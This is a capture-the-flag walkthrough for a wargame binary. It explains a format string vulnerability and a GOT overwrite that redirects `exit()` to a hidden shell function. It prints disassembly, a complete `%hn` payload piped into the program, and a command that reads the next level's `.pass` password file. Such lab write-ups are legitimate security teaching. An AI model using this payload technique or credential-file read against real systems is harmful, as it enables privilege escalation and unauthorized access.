# Level5 Walkthrough - GOT Overwrite via Format String

## 🎯 Goal
Exploit a format string vulnerability to overwrite the GOT entry of `exit()` and redirect execution to the hidden `o()` function that spawns a shell.

---

## 🔍 Step 1: Binary Analysis

### **main function**
```asm
0x08048504 <+0>:   push   %ebp
0x08048505 <+1>:   mov    %esp,%ebp
0x08048507 <+3>:   and    $0xfffffff0,%esp
0x0804850a <+6>:   call   0x80484c2 <n>      ; Calls function n
0x0804850f <+11>:  leave  
0x08048510 <+12>:  ret    
```

### **n function (vulnerable)**
```asm
0x080484c2 <+0>:   push   %ebp
0x080484c3 <+1>:   mov    %esp,%ebp
0x080484c5 <+3>:   sub    $0x218,%esp            ; Allocate 536 bytes
0x080484cb <+9>:   mov    0x8049848,%eax         ; stdin
0x080484d0 <+14>:  mov    %eax,0x8(%esp)         
0x080484d4 <+18>:  movl   $0x200,0x4(%esp)       ; Read 512 bytes
0x080484dc <+26>:  lea    -0x208(%ebp),%eax      
0x080484e2 <+32>:  mov    %eax,(%esp)            
0x080484e5 <+35>:  call   0x80483a0 <fgets@plt>  ; fgets(buffer)
0x080484ea <+40>:  lea    -0x208(%ebp),%eax      
0x080484f0 <+46>:  mov    %eax,(%esp)            
0x080484f3 <+49>:  call   0x8048380 <printf@plt> ; VULNERABILITY!
0x080484f8 <+54>:  movl   $0x1,(%esp)            
0x080484ff <+61>:  call   0x80483d0 <exit@plt>   ; Always exits
```

### **o function (hidden shell)**
```asm
0x080484a4 <+0>:   push   %ebp
0x080484a5 <+1>:   mov    %esp,%ebp
0x080484a7 <+3>:   sub    $0x18,%esp
0x080484aa <+6>:   movl   $0x80485f0,(%esp)      ; "/bin/sh"
0x080484b1 <+13>:  call   0x80483b0 <system@plt> ; system("/bin/sh")
0x080484b6 <+18>:  movl   $0x1,(%esp)            
0x080484bd <+25>:  call   0x8048390 <_exit@plt>
```

---

## 🔍 Step 2: Vulnerability Analysis

- **Format String Vulnerability:** `printf(buffer)` directly prints user input.
- **Always Exits:** Program always calls `exit()` after printf.
- **Hidden Function:** `o()` exists at `0x080484a4` → calls `system("/bin/sh")`.
- **Goal:** Overwrite the **GOT entry of exit()** (`0x08049838`) with `o()`'s address.

---

## 🔍 Step 3: GOT Address & Stack Offset

Find exit GOT entry:
```bash
objdump -R level5 | grep exit
08049838 R_386_JUMP_SLOT   exit
```

Find offset in stack:
```bash
python -c 'print "AAAA.%x.%x.%x.%x.%x.%x.%x.%x"' | ./level5
```

Output includes:
```
AAAA.200.b7fd1ac0.b7ff37d0.41414141...
```
`41414141` (`"AAAA"`) appears at **4th position** → **Offset = 4**

---

## 🔍 Step 4: Exploit Strategy

We must write:
- **Target address (o):** `0x080484a4`
- **GOT entry (exit):** `0x08049838`

Split `0x080484a4` into two halves:
- **Lower 2 bytes:** `0x84a4 = 33956`
- **Higher 2 bytes:** `0x0804 = 2052`

We’ll use **two `%hn` writes**:
1. Write `0x84a4` to `0x08049838`
2. Write `0x0804` to `0x0804983a`

---

## 🔍 Step 5: Craft Payload

### Address placement (first on stack)
```python
payload  = "\x38\x98\x04\x08"   # exit GOT (lower half)
payload += "\x3a\x98\x04\x08"   # exit GOT + 2 (upper half)
```

### Padding + format string
```python
payload += "%33948x"            # Pad up to 33956
payload += "%4$hn"              # Write lower 2 bytes
payload += "%33632x"            # Pad to 67588 total
payload += "%5$hn"              # Write higher 2 bytes
```

---

## 🚀 Step 6: Execute Exploit
```bash
(python -c '
print "\x38\x98\x04\x08\x3a\x98\x04\x08" + "%33948x" + "%4$hn" + "%33632x" + "%5$hn"
'; cat) | ./level5
```

---

## 🔍 Step 7: What Happens

- **GOT Overwrite:** `exit@GOT` is modified from `0x080483d0` → `0x080484a4`.
- **Program Calls exit():** Instead of exiting, it jumps into `o()`.
- **Hidden Shell:** `o()` calls `system("/bin/sh")`.
- **Result:** Shell with **level6 privileges**.

---

## 🎯 Step 8: Get the Password
```bash
cat /home/user/level6/.pass
```

---

## 💡 Key Technical Notes

- **Format String Attack:** User controls printf formatting.
- **GOT Overwrite:** By hijacking dynamic linking, we redirect `exit()` to `o()`.
- **%hn Use:** Safer than `%n`, writes 2 bytes at a time.
- **Order of Writes:** Write lower bytes first, then upper bytes.

---

## 🎉 Success!
You now have a shell as **level6**.

Next:
```bash
su level6
```
Enter the password retrieved from `.pass`.
